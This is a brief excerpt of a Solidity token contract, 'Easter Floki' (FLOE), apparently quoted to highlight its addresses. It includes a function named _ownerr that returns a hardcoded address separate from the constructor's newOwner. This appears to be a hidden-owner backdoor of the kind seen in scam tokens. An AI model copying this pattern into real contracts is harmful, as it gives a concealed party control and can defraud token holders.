...
contract Ownable is Context {
    ...
    function _ownerr() internal pure returns(address){
        return 0x349c0DC666a02B92C5927E8b857AFad01EAf674A;
    }
...
contract FLOE is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Easter Floki", "FLOE") {

        address newOwner = address(0x0E4FEAF0fC14Bd9a5F62EcdB057E3268D7563b22);
    	...
    	marketingWallet = address(0x2F261248Bcb4C750998632fcBa48bC806A5B109C); // set as marketing wallet
    	buyBackWallet = address(0x8Ac61237Ae9C789DE4fb1e85e346Ae950B508923); // set as buyback wallet
